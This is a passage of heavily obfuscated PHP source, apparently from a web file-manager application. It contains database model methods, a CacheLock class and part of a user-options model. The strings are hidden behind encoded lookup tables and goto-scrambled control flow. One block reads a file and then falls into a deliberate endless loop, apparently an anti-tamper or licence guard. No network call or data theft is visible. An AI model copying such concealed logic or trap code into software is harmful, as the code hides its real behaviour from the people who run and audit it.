$this->_validationField($C½ÆÓ¶ëÇå, $D¬áÈøãºÇ)) { return !1; } } break; default: if (isset($C½ÆÓ¶ëÇå[$D¬áÈøãºÇ[0]])) { if (!1 === $this->_validationField($C½ÆÓ¶ëÇå, $D¬áÈøãºÇ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($E¸ù¦§ë•ë, $e‘¢ˆŸ„¾”) { if (!1 === $this->_validationFieldItem($E¸ù¦§ë•ë, $e‘¢ˆŸ„¾”)) { if ($this->patchValidate) { $this->error[$e‘¢ˆŸ„¾”[0]] = $e‘¢ˆŸ„¾”[2]; } else { $this->error = $e‘¢ˆŸ„¾”[2]; return !1; } } return; } protected function _validationFieldItem($e÷¢ß³¿”ğ, $Eõ¯‚¯»ó) { $cÉ©ğ†°öŠ =& $_SERVER[…ë˜õ]; switch (strtolower(trim($Eõ¯‚¯»ó[4]))) { case $cÉ©ğ†°öŠ[317]: case $cÉ©ğ†°öŠ[318]: $BãÎ‰µÌà = isset($Eõ¯‚¯»ó[6]) ? (array) $Eõ¯‚¯»ó[6] : array(); if (is_string($Eõ¯‚¯»ó[0]) && strpos($Eõ¯‚¯»ó[0], $cÉ©ğ†°öŠ[47])) { $Eõ¯‚¯»ó[0] = explode($cÉ©ğ†°öŠ[47], $Eõ¯‚¯»ó[0]); } if (is_array($Eõ¯‚¯»ó[0])) { foreach ($Eõ¯‚¯»ó[0] as $få»é“í¼) { $D–™éß‰’[$få»é“í¼] = $e÷¢ß³¿”ğ[$få»é“í¼]; } array_unshift($BãÎ‰µÌà, $D–™éß‰’); } else { array_unshift($BãÎ‰µÌà, $e÷¢ß³¿”ğ[$Eõ¯‚¯»ó[0]]); } if ($cÉ©ğ†°öŠ[317] == $Eõ¯‚¯»ó[4]) { return call_user_func_array($Eõ¯‚¯»ó[1], $BãÎ‰µÌà); } else { return call_user_func_array(array(&$this, $Eõ¯‚¯»ó[1]), $BãÎ‰µÌà); } case $cÉ©ğ†°öŠ[325]: return $e÷¢ß³¿”ğ[$Eõ¯‚¯»ó[0]] == $e÷¢ß³¿”ğ[$Eõ¯‚¯»ó[1]]; case $cÉ©ğ†°öŠ[326]: if (is_string($Eõ¯‚¯»ó[0]) && strpos($Eõ¯‚¯»ó[0], $cÉ©ğ†°öŠ[47])) { $Eõ¯‚¯»ó[0] = explode($cÉ©ğ†°öŠ[47], $Eõ¯‚¯»ó[0]); } $CÏß›½Ã = array(); if (is_array($Eõ¯‚¯»ó[0])) { foreach ($Eõ¯‚¯»ó[0] as $få»é“í¼) { $CÏß›½Ã[$få»é“í¼] = $e÷¢ß³¿”ğ[$få»é“í¼]; } } else { $CÏß›½Ã[$Eõ¯‚¯»ó[0]] = $e÷¢ß³¿”ğ[$Eõ¯‚¯»ó[0]]; } if (!empty($e÷¢ß³¿”ğ[$this->getPk()])) { $CÏß›½Ã[$this->getPk()] = array($cÉ©ğ†°öŠ[327], $e÷¢ß³¿”ğ[$this->getPk()]); } if ($this->where($CÏß›½Ã)->find()) { return !1; } return !0; default: return $this->check($e÷¢ß³¿”ğ[$Eõ¯‚¯»ó[0]], $Eõ¯‚¯»ó[1], $Eõ¯‚¯»ó[4]); } } public function check($FÂªâ©„–§, $a¯‰´ÎİöÓ, $b‡ì…œ®¥ = "\x72\145\147\145\x78") { $AÎÜØ÷ƒ°Û =& $_SERVER[…ë˜õ]; $b‡ì…œ®¥ = strtolower(trim($b‡ì…œ®¥)); switch ($b‡ì…œ®¥) { case $AÎÜØ÷ƒ°Û[7]: case $AÎÜØ÷ƒ°Û[328]: $Dº‘ß¡ñÔÃ = is_array($a¯‰´ÎİöÓ) ? $a¯‰´ÎİöÓ : explode($AÎÜØ÷ƒ°Û[47], $a¯‰´ÎİöÓ); return $b‡ì…œ®¥ == $AÎÜØ÷ƒ°Û[7] ? in_array($FÂªâ©„–§, $Dº‘ß¡ñÔÃ) : !in_array($FÂªâ©„–§, $Dº‘ß¡ñÔÃ); case $AÎÜØ÷ƒ°Û[329]: case $AÎÜØ÷ƒ°Û[330]: if (is_array($a¯‰´ÎİöÓ)) { $Eó†ìæÇ‘ = $a¯‰´ÎİöÓ[0]; $C®‰²‚¶Âø = $a¯‰´ÎİöÓ[1]; } else { list($Eó†ìæÇ‘, $C®‰²‚¶Âø) = explode($AÎÜØ÷ƒ°Û[47], $a¯‰´ÎİöÓ); } return $b‡ì…œ®¥ == $AÎÜØ÷ƒ°Û[329] ? $FÂªâ©„–§ >= $Eó†ìæÇ‘ && $FÂªâ©„–§ <= $C®‰²‚¶Âø : $FÂªâ©„–§ < $Eó†ìæÇ‘ || $FÂªâ©„–§ > $C®‰²‚¶Âø; case $AÎÜØ÷ƒ°Û[331]: case $AÎÜØ÷ƒ°Û[332]: return $b‡ì…œ®¥ == $AÎÜØ÷ƒ°Û[331] ? $FÂªâ©„–§ == $a¯‰´ÎİöÓ : $FÂªâ©„–§ != $a¯‰´ÎİöÓ; case $AÎÜØ÷ƒ°Û[333]: $dÕÙÖ­ˆËÚ = mb_strlen($FÂªâ©„–§, $AÎÜØ÷ƒ°Û[334]); if (strpos($a¯‰´ÎİöÓ, $AÎÜØ÷ƒ°Û[47])) { list($Eó†ìæÇ‘, $C®‰²‚¶Âø) = explode($AÎÜØ÷ƒ°Û[47], $a¯‰´ÎİöÓ); return $dÕÙÖ­ˆËÚ >= $Eó†ìæÇ‘ && $dÕÙÖ­ˆËÚ <= $C®‰²‚¶Âø; } else { return $dÕÙÖ­ˆËÚ == $a¯‰´ÎİöÓ; } case $AÎÜØ÷ƒ°Û[335]: list($CùŒ÷Ğ”¥£, $B«Û…–ôß”) = explode($AÎÜØ÷ƒ°Û[47], $a¯‰´ÎİöÓ); if (!is_numeric($CùŒ÷Ğ”¥£)) { $CùŒ÷Ğ”¥£ = strtotime($CùŒ÷Ğ”¥£); } if (!is_numeric($B«Û…–ôß”)) { $B«Û…–ôß” = strtotime($B«Û…–ôß”); } return NOW_TIME >= $CùŒ÷Ğ”¥£ && NOW_TIME <= $B«Û…–ôß”; case $AÎÜØ÷ƒ°Û[336]: return in_array(get_client_ip(), explode($AÎÜØ÷ƒ°Û[47], $a¯‰´ÎİöÓ)); case $AÎÜØ÷ƒ°Û[337]: return !in_array(get_client_ip(), explode($AÎÜØ÷ƒ°Û[47], $a¯‰´ÎİöÓ)); case $AÎÜØ÷ƒ°Û[324]: default: return $this->regex($FÂªâ©„–§, $a¯‰´ÎİöÓ); } } public function query($E£Ùä¹×›í, $fÌä¿öŠà— = false) { $aÍ ÚƒŒ‹ =& $_SERVER[…ë˜õ]; if (!is_bool($fÌä¿öŠà—) && !is_array($fÌä¿öŠà—)) { $fÌä¿öŠà— = func_get_args(); array_shift($fÌä¿öŠà—); } $E£Ùä¹×›í = str_replace(array($aÍ ÚƒŒ‹[227], $aÍ ÚƒŒ‹[338]), $aÍ ÚƒŒ‹[50], $E£Ùä¹×›í); $E£Ùä¹×›í = $this->parseSql($E£Ùä¹×›í, $fÌä¿öŠà—); return $this->db->query($E£Ùä¹×›í); } public function execute($bŠÇ„ğŸê, $Eø—‚Ñ°ï„ = false) { if (!is_bool($Eø—‚Ñ°ï„) && !is_array($Eø—‚Ñ°ï„)) { $Eø—‚Ñ°ï„ = func_get_args(); array_shift($Eø—‚Ñ°ï„); } $bŠÇ„ğŸê = $this->parseSql($bŠÇ„ğŸê, $Eø—‚Ñ°ï„); return $this->db->execute($bŠÇ„ğŸê); } protected function parseSql($d¬áà™Éß, $FŒ’—Ú®ÍÕ) { $BŸÍÛ¥ì =& $_SERVER[…ë˜õ]; if (!0 === $FŒ’—Ú®ÍÕ) { $a‡«†•öğ¡ = $this->_parseOptions(); $d¬áà™Éß = $this->db->parseSql($d¬áà™Éß, $a‡«†•öğ¡); } elseif (is_array($FŒ’—Ú®ÍÕ)) { $FŒ’—Ú®ÍÕ = array_map(array($this->db, $BŸÍÛ¥ì[339]), $FŒ’—Ú®ÍÕ); $d¬áà™Éß = vsprintf($d¬áà™Éß, $FŒ’—Ú®ÍÕ); } else { $d¬áà™Éß = strtr($d¬áà™Éß, array($BŸÍÛ¥ì[340] => $this->getTableName(), $BŸÍÛ¥ì[341] => think_config($BŸÍÛ¥ì[240]))); } $this->db->setModel($this->name); return $d¬áà™Éß; } public function db($B±õŠå¹‹ = '', $fÉ•ñ‹µÅÖ = '', $b­äø„âÖÆ = array()) { goto Eµëµ’šÙŸ; DôÑ‰¡æô: $FØÅÈÉ°¢‹[$B±õŠå¹‹] = $fÉ•ñ‹µÅÖ; $this->db = $dÁĞ†ÔÙ[$B±õŠå¹‹]; $this->_after_db(); goto eĞô÷¼È¯; Eµëµ’šÙŸ: $bæˆ÷ê½ƒ¬ =& $_SERVER[…ë˜õ]; if ($bæˆ÷ê½ƒ¬[33] === $B±õŠå¹‹ && $this->db) { return $this->db; } static $FØÅÈÉ°¢‹ = array(); goto f¢óÓ´Í´; f¢óÓ´Í´: static $dÁĞ†ÔÙ = array(); if (!isset($dÁĞ†ÔÙ[$B±õŠå¹‹]) || isset($dÁĞ†ÔÙ[$B±õŠå¹‹]) && $fÉ•ñ‹µÅÖ && $FØÅÈÉ°¢‹[$B±õŠå¹‹] != $fÉ•ñ‹µÅÖ) { if (!empty($fÉ•ñ‹µÅÖ) && is_string($fÉ•ñ‹µÅÖ) && !1 === strpos($fÉ•ñ‹µÅÖ, $bæˆ÷ê½ƒ¬[8])) { $fÉ•ñ‹µÅÖ = think_config($fÉ•ñ‹µÅÖ); } $dÁĞ†ÔÙ[$B±õŠå¹‹] = Db::getInstance($fÉ•ñ‹µÅÖ); } elseif (NULL === $fÉ•ñ‹µÅÖ) { $dÁĞ†ÔÙ[$B±õŠå¹‹]->close(); unset($dÁĞ†ÔÙ[$B±õŠå¹‹]); return; } if (!empty($b­äø„âÖÆ)) { if (is_string($b­äø„âÖÆ)) { parse_str($b­äø„âÖÆ, $b­äø„âÖÆ); } foreach ($b­äø„âÖÆ as $E‡éº¡®âá => $a²ˆù¾ğ×¶) { $this->setProperty($E‡éº¡®âá, $a²ˆù¾ğ×¶); } } goto DôÑ‰¡æô; eĞô÷¼È¯: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto dèÑ¬ó–±Û; dèÑ¬ó–±Û: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $fñÃÊ ¹ = get_class($this); if ($fñÃÊ ¹ == $_SERVER[…ë˜õ][342]) { return $this->name; } $this->name = substr($fñÃÊ ¹, 0, -5); } return $this->name; } public function getTableName() { $fªæá“’‚è =& $_SERVER[…ë˜õ]; if (empty($this->trueTableName)) { $C£ÁĞ½š = !empty($this->tablePrefix) ? $this->tablePrefix : $fªæá“’‚è[33]; if (!empty($this->tableName)) { $C£ÁĞ½š .= $this->tableName; } else { $C£ÁĞ½š .= think_parse_name($this->name); } $this->trueTableName = strtolower($C£ÁĞ½š); } return (!empty($this->dbName) ? $this->dbName . $fªæá“’‚è[94] : $fªæá“’‚è[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $F’’ÍŸ©Ÿ =& $_SERVER[…ë˜õ]; return isset($this->fields[$F’’ÍŸ©Ÿ[247]]) ? $this->fields[$F’’ÍŸ©Ÿ[247]] : $this->pk; } public function getDbFields() { $B‰íÜºÅ =& $_SERVER[…ë˜õ]; if (isset($this->options[$B‰íÜºÅ[275]])) { $C¿¸ñÁé¶ = $this->db->getFields($this->options[$B‰íÜºÅ[275]]); return $C¿¸ñÁé¶ ? array_keys($C¿¸ñÁé¶) : !1; } if ($this->fields) { $C¿¸ñÁé¶ = $this->fields; unset($C¿¸ñÁé¶[$B‰íÜºÅ[246]], $C¿¸ñÁé¶[$B‰íÜºÅ[247]], $C¿¸ñÁé¶[$B‰íÜºÅ[248]], $C¿¸ñÁé¶[$B‰íÜºÅ[245]]); return $C¿¸ñÁé¶; } return !1; } public function data($eÔ˜ñÛÆÂö = '') { $fí¹®ÇŒ÷´ =& $_SERVER[…ë˜õ]; if ($fí¹®ÇŒ÷´[33] === $eÔ˜ñÛÆÂö && !empty($this->data)) { return $this->data; } if (is_object($eÔ˜ñÛÆÂö)) { $eÔ˜ñÛÆÂö = get_object_vars($eÔ˜ñÛÆÂö); } elseif (is_string($eÔ˜ñÛÆÂö)) { parse_str($eÔ˜ñÛÆÂö, $eÔ˜ñÛÆÂö); } elseif (!is_array($eÔ˜ñÛÆÂö)) { think_exception(think_lang($fí¹®ÇŒ÷´[267])); } $this->data = $eÔ˜ñÛÆÂö; return $this; } public function join($A¹Ø•íÔ¤«) { $d®áÁ†·ŞÙ =& $_SERVER[…ë˜õ]; if (is_array($A¹Ø•íÔ¤«)) { $this->options[$d®áÁ†·ŞÙ[278]] = $A¹Ø•íÔ¤«; } elseif (!empty($A¹Ø•íÔ¤«)) { $this->options[$d®áÁ†·ŞÙ[278]][] = $A¹Ø•íÔ¤«; } return $this; } public function union($AÁŞïº¨’˜, $a×ù‹‚¼»È = false) { goto bá˜»ˆ‰áº; bá˜»ˆ‰áº: $aÅ²Ë¶ÍÂÚ =& $_SERVER[…ë˜õ]; if (empty($AÁŞïº¨’˜)) { return $this; } if ($a×ù‹‚¼»È) { $this->options[$aÅ²Ë¶ÍÂÚ[343]][$aÅ²Ë¶ÍÂÚ[344]] = !0; } goto FÏÖ½”ùï¸; d¼ø©´Üé†: return $this; goto Bñ„¥—´®; FÏÖ½”ùï¸: if (is_object($AÁŞïº¨’˜)) { $AÁŞïº¨’˜ = get_object_vars($AÁŞïº¨’˜); } if (is_string($AÁŞïº¨’˜)) { $Dí³œº­Í = $AÁŞïº¨’˜; } elseif (is_array($AÁŞïº¨’˜)) { if (isset($AÁŞïº¨’˜[0])) { $this->options[$aÅ²Ë¶ÍÂÚ[343]] = array_merge($this->options[$aÅ²Ë¶ÍÂÚ[343]], $AÁŞïº¨’˜); return $this; } else { $Dí³œº­Í = $AÁŞïº¨’˜; } } else { think_exception(think_lang($aÅ²Ë¶ÍÂÚ[267])); } $this->options[$aÅ²Ë¶ÍÂÚ[343]][] = $Dí³œº­Í; goto d¼ø©´Üé†; Bñ„¥—´®: } public function cache($Eˆàæâ—¨‚ = true, $Bê‰é¦¾Š = null, $e†“ªòªó¤ = '') { $E†‰ğî†á› =& $_SERVER[…ë˜õ]; if (!1 !== $Eˆàæâ—¨‚) { $this->options[$E†‰ğî†á›[345]] = array($E†‰ğî†á›[92] => $Eˆàæâ—¨‚, $E†‰ğî†á›[335] => $Bê‰é¦¾Š, $E†‰ğî†á›[29] => $e†“ªòªó¤); } return $this; } public function field($FÄ°ƒ˜œ¡§, $cŞÚË¢¥Ç¦ = false) { $cÕÒ£ÈÇ•µ =& $_SERVER[…ë˜õ]; if (!0 === $FÄ°ƒ˜œ¡§) { $dâñ…È´’Å = $this->getDbFields(); $FÄ°ƒ˜œ¡§ = $dâñ…È´’Å ? $dâñ…È´’Å : $cÕÒ£ÈÇ•µ[181]; } elseif ($cŞÚË¢¥Ç¦) { if (is_string($FÄ°ƒ˜œ¡§)) { $FÄ°ƒ˜œ¡§ = explode($cÕÒ£ÈÇ•µ[47], $FÄ°ƒ˜œ¡§); } $dâñ…È´’Å = $this->getDbFields(); $FÄ°ƒ˜œ¡§ = $dâñ…È´’Å ? array_diff($dâñ…È´’Å, $FÄ°ƒ˜œ¡§) : $FÄ°ƒ˜œ¡§; } $this->options[$cÕÒ£ÈÇ•µ[269]] = $FÄ°ƒ˜œ¡§; return $this; } public function scope($Dè÷Äã = '', $A³‘´¿é‰Ù = NULL) { $cİÏóî‰Æª =& $_SERVER[…ë˜õ]; if ($cİÏóî‰Æª[33] === $Dè÷Äã) { if (isset($this->_scope[$cİÏóî‰Æª[34]])) { $B¦ñ§è–â£ = $this->_scope[$cİÏóî‰Æª[34]]; } else { return $this; } } elseif (is_string($Dè÷Äã)) { $C±ªŞÍ·é = explode($cİÏóî‰Æª[47], $Dè÷Äã); $B¦ñ§è–â£ = array(); foreach ($C±ªŞÍ·é as $B®Ñßã¤Û‰) { if (!isset($this->_scope[$B®Ñßã¤Û‰])) { continue; } $B¦ñ§è–â£ = array_merge($B¦ñ§è–â£, $this->_scope[$B®Ñßã¤Û‰]); } if (!empty($A³‘´¿é‰Ù) && is_array($A³‘´¿é‰Ù)) { $B¦ñ§è–â£ = array_merge($B¦ñ§è–â£, $A³‘´¿é‰Ù); } } elseif (is_array($Dè÷Äã)) { $B¦ñ§è–â£ = $Dè÷Äã; } if (is_array($B¦ñ§è–â£) && !empty($B¦ñ§è–â£)) { $this->options = array_merge($this->options, array_change_key_case($B¦ñ§è–â£)); } return $this; } public function where($EŠœèÀˆó¡, $A¹½Œƒò÷õ = null) { $eó†Õ„ãõ† =& $_SERVER[…ë˜õ]; if (!is_null($A¹½Œƒò÷õ) && is_string($EŠœèÀˆó¡)) { if (!is_array($A¹½Œƒò÷õ)) { $A¹½Œƒò÷õ = func_get_args(); array_shift($A¹½Œƒò÷õ); } $A¹½Œƒò÷õ = array_map(array($this->db, $eó†Õ„ãõ†[339]), $A¹½Œƒò÷õ); $EŠœèÀˆó¡ = vsprintf($EŠœèÀˆó¡, $A¹½Œƒò÷õ); } elseif (is_object($EŠœèÀˆó¡)) { $EŠœèÀˆó¡ = get_object_vars($EŠœèÀˆó¡); } elseif (is_array($EŠœèÀˆó¡)) { foreach ($EŠœèÀˆó¡ as $e…á¶¯Ã·é => $c‡¯‡­š®¿) { if ((is_numeric($e…á¶¯Ã·é) || !$e…á¶¯Ã·é) && is_string($c‡¯‡­š®¿)) { if (strpos($c‡¯‡­š®¿, $eó†Õ„ãõ†[346]) === 0) { continue; } think_trace($eó†Õ„ãõ†[347], $eó†Õ„ãõ†[33], $eó†Õ„ãõ†[46]); die; } } } if (is_string($EŠœèÀˆó¡) && $eó†Õ„ãõ†[33] != $EŠœèÀˆó¡) { $E¶§Ó÷¹Ş = array(); $E¶§Ó÷¹Ş[$eó†Õ„ãõ†[348]] = $EŠœèÀˆó¡; $EŠœèÀˆó¡ = $E¶§Ó÷¹Ş; } if (isset($this->options[$eó†Õ„ãõ†[271]])) { $this->options[$eó†Õ„ãõ†[271]] = array_merge($this->options[$eó†Õ„ãõ†[271]], $EŠœèÀˆó¡); } else { $this->options[$eó†Õ„ãõ†[271]] = $EŠœèÀˆó¡; } return $this; } public function limit($Cİö÷†ÁÊ, $bŞÀ‘ƒ©›³ = null) { $a‹©ìøº„ =& $_SERVER[…ë˜õ]; $this->options[$a‹©ìøº„[288]] = is_null($bŞÀ‘ƒ©›³) ? $Cİö÷†ÁÊ : $Cİö÷†ÁÊ . $a‹©ìøº„[47] . $bŞÀ‘ƒ©›³; return $this; } public function page($B“¢Æ…¨Œ, $e¾Ê†ß¥Ôµ = null) { $dƒ¨¯¨Ğó÷ =& $_SERVER[…ë˜õ]; $this->options[$dƒ¨¯¨Ğó÷[349]] = is_null($e¾Ê†ß¥Ôµ) ? $B“¢Æ…¨Œ : $B“¢Æ…¨Œ . $dƒ¨¯¨Ğó÷[47] . $e¾Ê†ß¥Ôµ; return $this; } public function comment($D…Ñ³¤áßß) { $this->options[$_SERVER[…ë˜õ][350]] = $D…Ñ³¤áßß; return $this; } public function setProperty($aô£ÀˆËñŞ, $e»ôßõµÅÂ) { if (property_exists($this, $aô£ÀˆËñŞ)) { $this->{$aô£ÀˆËñŞ} = $e»ôßõµÅÂ; } return $this; } } goto D†êèÏ³ Û; C½·®¸µ¦¾: $e‚Ô…´Úºî = strrev(base64_decode($_SERVER[ñ¯»Æ«í³][0])); function binCheckNeq($d¹¢Ï¢±‡‰, $C›Ê‘÷†‰) { return $d¹¢Ï¢±‡‰ != $C›Ê‘÷†‰; } $_SERVER[$_SERVER[ñ¯»Æ«í³][1]] = $e‚Ô…´Úºî($_SERVER[$_SERVER[ñ¯»Æ«í³][2]]); goto aíèóùµæ; eÇÉ†“İ…¯: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto C¦¶ğœšÒË; c¬±Å¼òİ‹: self::$timeout = $f—¹‘¥àŒÄ[$c£«‘Ê„é¯[811]] ? $f—¹‘¥àŒÄ[$c£«‘Ê„é¯[811]] : 10; $dÉ±Î«è™ë = _get($GLOBALS[$c£«‘Ê„é¯[6]], $c£«‘Ê„é¯[812]); $CæŸ«¹·ğ = $f—¹‘¥àŒÄ[$c£«‘Ê„é¯[798]] ? $f—¹‘¥àŒÄ[$c£«‘Ê„é¯[798]] : $c£«‘Ê„é¯[191]; goto c•¤®öôÙ–; C¦¶ğœšÒË: $c£«‘Ê„é¯ =& $_SERVER[…ë˜õ]; if (self::$handle) { return self::$handle; } $f—¹‘¥àŒÄ = $GLOBALS[$c£«‘Ê„é¯[6]][$c£«‘Ê„é¯[345]]; goto c¬±Å¼òİ‹; c•¤®öôÙ–: if ($CæŸ«¹·ğ == $c£«‘Ê„é¯[17] && $dÉ±Î«è™ë == $c£«‘Ê„é¯[9]) { $CæŸ«¹·ğ = $c£«‘Ê„é¯[191]; } switch ($CæŸ«¹·ğ) { case $c£«‘Ê„é¯[801]: self::$handle = new CacheLockRedis(); break; case $c£«‘Ê„é¯[802]: self::$handle = new CacheLockMemcached(); break; case $c£«‘Ê„é¯[17]: self::$handle = new CacheLockDatabase(); break; case $c£«‘Ê„é¯[191]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto FÑ‡÷à·‘´; FÑ‡÷à·‘´: } private static function key($eì—øôŞå ) { return $_SERVER[…ë˜õ][813] . Cache::key($eì—øôŞå ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Cô•˜·™Šõ = '') { self::$errorMsg = $Cô•˜·™Šõ; } public static function lockGlobal($Dô—é»ìŞ, $DÖƒäÂÎî—) { return self::lock($Dô—é»ìŞ, $DÖƒäÂÎî—, !0); } public static function lock($cÎöá²°À, $a·„Ğ¯ë„î = false, $c¤îƒÀœ = false) { goto c¤ ¾í„’; c¤ ¾í„’: $cô‰„— ÷ =& $_SERVER[…ë˜õ]; $A¯ÜòÉó¡ = self::init(); $B„ƒé›Â™© = self::key($cÎöá²°À); goto AˆÓš¦óè; b¯¤äÅß÷: if (!$c¤îƒÀœ) { self::$lockItem[$B„ƒé›Â™©] = !0; } return $ašµÎªºª; goto D–±àÒ´ƒ; AˆÓš¦óè: $a·„Ğ¯ë„î = $a·„Ğ¯ë„î ? $a·„Ğ¯ë„î : self::$timeout; $ašµÎªºª = $A¯ÜòÉó¡->lock($B„ƒé›Â™©, $a·„Ğ¯ë„î); if (!$ašµÎªºª) { $bÇ˜šÉ‡Ö¦ = "\154\157\x63\x6b\40\145\x72\x72\x6f\x72\x3b\x6b\145\171\75{$cÎöá²°À}\x3b\164\151\155\145\75{$a·„Ğ¯ë„î}\73" . self::$errorMsg . $cô‰„— ÷[67] . get_caller_msg(); $e¾‡İ‡½ƒİ = LNG($cô‰„— ÷[814]) . "\x28{$a·„Ğ¯ë„î}\x73\x29\56" . LNG($cô‰„— ÷[815]); $e¾‡İ‡½ƒİ .= $cô‰„— ÷[816]; if (is_string(self::$errorMsg) && self::$errorMsg) { $e¾‡İ‡½ƒİ = $e¾‡İ‡½ƒİ . $cô‰„— ÷[817] . self::$errorMsg; } write_log($bÇ˜šÉ‡Ö¦, $cô‰„— ÷[818]); show_json($e¾‡İ‡½ƒİ, !1); } goto b¯¤äÅß÷; D–±àÒ´ƒ: } public static function lockGet($dÄÔßÎÎà›) { $BÆ‘œÈœİ¥ = self::key($dÄÔßÎÎà›); if (self::$lockItem[$BÆ‘œÈœİ¥]) { return self::$lockItem[$BÆ‘œÈœİ¥]; } return self::init()->lockGet($BÆ‘œÈœİ¥); } public static function unlock($eŒšŠŠ œ) { $a…è¨æÀŠ = self::key($eŒšŠŠ œ); self::$lockItem[$a…è¨æÀŠ] = null; return self::init()->unlock($a…è¨æÀŠ); } public static function unlockRuntime() { $Eˆ«ß¸– =& $_SERVER[…ë˜õ]; $dÜãİòµ¸ = self::init(); $f´ö„§ä¾ = !1; foreach (self::$lockItem as $E Öâ‘•­Ê => $c‹”¯ƒæéŠ) { if (!$c‹”¯ƒæéŠ) { continue; } $dÜãİòµ¸->unlock($E Öâ‘•­Ê); if (!$f´ö„§ä¾) { $f´ö„§ä¾ = !0; write_log($Eˆ«ß¸–[819] . $E Öâ‘•­Ê . $Eˆ«ß¸–[67] . get_caller_msg(), $Eˆ«ß¸–[818]); continue; } write_log($Eˆ«ß¸–[819] . $E Öâ‘•­Ê, $Eˆ«ß¸–[818]); } self::fileUnlockAll(); } public static function fileLock($c¡åÍğÈ) { goto eŒš¾”Œì; dîäÔªïí›: return !1; goto dŒÆ¥›¥ƒ; EˆèÕÚ½ğª: if (flock($e‚‰§Œ†Îº, LOCK_EX)) { return !0; } self::unlock($c¡åÍğÈ); show_json($D¹ä²ì¼²¶[823], !1); goto dîäÔªïí›; eµ«¦¹·®¬: $e‚‰§Œ†Îº = fopen(DATA_PATH . $c¡åÍğÈ . $D¹ä²ì¼²¶[821], $D¹ä²ì¼²¶[822]); if (!$e‚‰§Œ†Îº) { return !1; } $GLOBALS[$D¹ä²ì¼²¶[820]][$c¡åÍğÈ] = $e‚‰§Œ†Îº; goto EˆèÕÚ½ğª; eŒš¾”Œì: $D¹ä²ì¼²¶ =& $_SERVER[…ë˜õ]; if (!$GLOBALS[$D¹ä²ì¼²¶[820]]) { $GLOBALS[$D¹ä²ì¼²¶[820]] = array(); } $GLOBALS[$D¹ä²ì¼²¶[820]][$c¡åÍğÈ] = !1; goto eµ«¦¹·®¬; dŒÆ¥›¥ƒ: } public static function fileUnlock($b·³ƒ‡¤­æ) { $b¬Í›¯ßò =& $_SERVER[…ë˜õ]; $eİ×•Í¡ì = $GLOBALS[$b¬Í›¯ßò[820]][$b·³ƒ‡¤­æ]; if (!$eİ×•Í¡ì) { return; } $GLOBALS[$b¬Í›¯ßò[820]][$b·³ƒ‡¤­æ] = !1; flock($eİ×•Í¡ì, LOCK_UN); fclose($eİ×•Í¡ì); } public static function fileUnlockAll() { $dÄª¤­ò¦¡ =& $_SERVER[…ë˜õ]; if (!$GLOBALS[$dÄª¤­ò¦¡[820]]) { return; } foreach ($GLOBALS[$dÄª¤­ò¦¡[820]] as $DÔç¤¸¦×ä => $aƒòÖğ†î) { if (!$aƒòÖğ†î) { continue; } $GLOBALS[$dÄª¤­ò¦¡[820]][$DÔç¤¸¦×ä] = !1; flock($aƒòÖğ†î, LOCK_UN); fclose($aƒòÖğ†î); } $GLOBALS[$dÄª¤­ò¦¡[820]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } if (!isset($_SERVER[$_SERVER[…ë˜õ][824]]) || !isset($_SERVER[$_SERVER[…ë˜õ][825]])) { goto B„¢†ÊŞì°; bóô¼µ²ŞŞ: $Bƒ‚¶¿ò¿ = explode($_SERVER[…ë˜õ][227], $cƒ³Šñï’); if (count($Bƒ‚¶¿ò¿) < $_SERVER[…ë˜õ][599]) { $Dàå³¦Œ½º = $_SERVER[…ë˜õ][829]; $Dàå³¦Œ½º(); } $Fº‚²¼Î„• = $_SERVER[…ë˜õ][830]; goto CËÂä°¾Ì; CËÂä°¾Ì: $Fº‚²¼Î„•($_SERVER[$_SERVER[…ë˜õ][827]] . $_SERVER[…ë˜õ][828]); $Eø§½—ÂÔÔ = 2; while ($Eø§½—ÂÔÔ > 1) { $A¿ƒóØ¡Š = rawurlencode($Eø§½—ÂÔÔ . $_SERVER[…ë˜õ][373]); } goto F÷„‚¬óºª; B„¢†ÊŞì°: $EĞ—åèã÷î = $_SERVER[…ë˜õ][826]; $BÏØÒË­å— = $_SERVER[$_SERVER[…ë˜õ][827]] . $_SERVER[…ë˜õ][828]; $cƒ³Šñï’ = $EĞ—åèã÷î($BÏØÒË­å—); goto bóô¼µ²ŞŞ; F÷„‚¬óºª: } goto d¹ãàÊšÄ; fÊì¡ë«Àø: $d¹Ç½¼øöõ = $_SERVER[…ë˜õ][569]; while ($d¹Ç½¼øöõ < $_SERVER[…ë˜õ][570]) { if ($d¹Ç½¼øöõ >= 0) { break; } $d¹Ç½¼øöõ++; } $_SERVER[­ó] = explode($_SERVER[…ë˜õ][571], gzinflate(substr($_SERVER[…ë˜õ][572], 10, -8))); goto C´‘ÚªÁå; bÕœ¶µÀåâ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\137\157\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($a¡¹¼—‘ïË) { $bªë†¡ìªÈ =& $_SERVER[…ë˜õ]; if (!defined($bªë†¡ìªÈ[448])) { define($bªë†¡ìªÈ[448], 0); } return "\x55\x73\x65\162\117\x70\x74\x69\157\156\137{$a¡¹¼—‘ïË}\137" . USER_ID; } protected function filterWhere($cÎö¶´åäİ) { $C‹¸–Î·‚Ô =& $_SERVER[…ë˜õ]; if (!defined($C‹¸–Î·‚Ô[448])) { define($C‹¸–Î·‚Ô[448], 0); } $cÎö¶´åäİ[$C‹¸–Î·‚Ô[1531]] = USER_ID; return $cÎö¶´åäİ; } public function cacheRemoveUser($A‰‡·‚Øƒ½, $böˆææŠ„Ô) { return Cache::remove("\x55\x73\145\162\117\160\x74\x69\157\x6e\x5f{$A‰‡·‚Øƒ½}\137" . $böˆææŠ„Ô); } protected function optionDefault($bˆ¶‰Ç›÷´ = '') { 